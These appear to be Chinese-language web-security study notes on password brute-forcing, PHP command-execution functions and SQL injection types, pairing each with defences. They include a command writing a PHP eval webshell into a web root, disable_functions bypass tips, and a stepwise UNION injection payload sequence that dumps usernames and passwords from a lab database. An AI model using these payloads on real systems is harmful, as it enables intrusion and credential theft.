# 密码爆破

## 原理

使用了弱口令或对密码验证没有做严格的限制策略，黑客可以通过弱口令爆破或穷举爆破不断尝试登录验证，只要时间足够长，理论上暴力破解可以破解所有密码。

## 利用

通过字典生成器生成专属密码字典
BurpSuite爆破模块密码爆破，获取管理员后台或其他敏感密码

## 防御

- 使用生物识别
- 短信或邮箱二次验证
- 限制密码登录错误次数并设置账户锁定策略

# 命令执行

## 原理

后端代码没有做严格的过滤或限制，导致用户输入的数据可以被作为系统命令执行

|函数名|输出情况|代码示例|
|---|---|---|
|system|自带输出，不需要echo|system('whoami');|
|exec|只能输出最后一行，需要主动输出|echo exec('whoami');|
|shell_exec|需要主动输出|echo shell_exec('whoami');|
|passthru|响应主动输出|passthru($_REQUEST['aaa'])|
|popen|不带输出，也不返回结果|popen('ipconfig > 1.txt','r');echo file_get_contents('1.txt');|
|``|反引号在php中表示命令执行|echo \`whoami`|
|注意|eval/assert|不是命令执行函数|

## 危害

1. 获取web服务器权限执行命令
2. 读写文件
3. 反弹shell
4. 控制web服务器

## 利用

常用于反弹shell、或创建后门文件、读取敏感文件信息

以windwos举例，攻击者利用web用户权限执行命令进行提权

1. 查看当前路径 cd
2. 写入任意文件 echo "<?php eval();?>" > c:\phpstudy\www\phpinfo.php

## 防御

1. 尽量减少使用命令执行函数或禁用disable_functions
2. 对传入参数过滤，对敏感字符转义
3. 参数值使用引号包括，拼接前使用addslashes进行转义

## 绕过disable_functions
1.  disable_functions是一个黑名单机制，所以可能存在未被禁用的函数
2. 利用环境变量LD_PRELOAD绕过，LD_PRELOAD是Linux系统下的一个环境变量，可以利用运行指定动态链接库so文件，所以前提需要可以上传so文件，使用putenv指定上传的so文件进行恶意攻击，**用蚁剑插件尝试绕一下就行，绕不了就算了**
3. Apache+mod_cgi+.htacess绕过

## structs2命令执行
 [structs2一堆远程代码执行漏洞](https://vulhub.org/#/environments/struts2)

# SQL注入

## 原理

后端代码对用户输入数据没有做严格限制，用户输入的数据可以拼接到SQL语句中执行并生效，导致原本程序中sql语句的执行逻辑发生变化，黑客可以以此构造恶意代码对服务器进行攻击

**分类及成因**

主要有联合查询、报错查询、布尔盲注、时间盲注四大类

和其他由于数据库或服务器配置原因导致的注入

- 二次编码注入
  1. 由于使用了转义函数对输入的参数进行了转义，无法使用单引号，如果可以用单引号就没必要多此一举；
  2. 在执行sql语句前使用了urldecode解码，就可以输入%2527来代替单引号，%25url解码后是百分号，%27在后台又会进行一次默认解码变成单引号
  
- 二阶注入
  1. 后端代码攻击者输入的语句进行了转义，这些语句没有立刻执行，但是被原样保持进了数据库；
  2. 但在其他地方调用数据库中内容是攻击语句的数据时没有再次转义，导致攻击语句生效
  
- 堆叠注入
  1. mysql数据库在语句执行时使用了mysqli_multi_query
  2. sqlserver数据库自身天然支持堆叠注入
  
- 宽字节注入
  1. 使用了转义函数将特殊字符转义，比如单引号转换成\\'
  2. 当前一个字符ASCII码大于128，gbk会将其和后面的字符组合识别成一个汉字，比如攻击者可以使用%df'进行注入，转义后变成%df\\'，gbk编码为%df%5c%27，%df%5c会被组合识别成一个汉字，%27就变成了单引号

- Header头注入

  常见注入位置

  - referer
  - cookie
  - User-Agent
  - X-Forwarded-For
  - Client-IP

## 危害

1. 敏感数据泄露
2. web服务器被控制

## 关键函数

addslashes

mysql_real_escape_string

mysql_set_charset()



## 防御

宽字节注入

- 不用gbk编码
- 使用mysql_set_charset()和mysql_real_escape_string()
- PDO预处理

Header注入

- PDO预处理

二次编码注入

- 避免先转义再urldecode
- PDO预处理

堆叠注入

- mysql不使用mysqli_multi_query
- PDO预处理(只支持一条语句)

二次注入

- 严格限制每一处数据调用
- PDO预处理

字符型注入

- mysql_escape_string干掉引号

数字型注入

- is_number干掉所有非数字内容

拦截关键字(WAF常用方法)

- 拦截order、union、select、information、schema、database

## 注入步骤
- 判断注入类型
  - id=1' and 1=1 --+
  - id=-1' or 1=1 --+

- 判断字段数
  - id=1' order by 3--+

- 获取当前数据库名
  - id=-1' union select 1,(select database()),3 --+

- 获取所有数据库
  - id=-1' union selecy 1,group_concat(schema_name),3 from information_schema.schemata --+

- 获取当前数据库表名
  - id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

- 获取users表所有字段
  - id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='security' --+

- 获取users表所有用户名和密码信息
  - id=-1' union select group_concat(username),group_concat(password) from users

- 获取security.users表所有字段
  - id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='security' --+
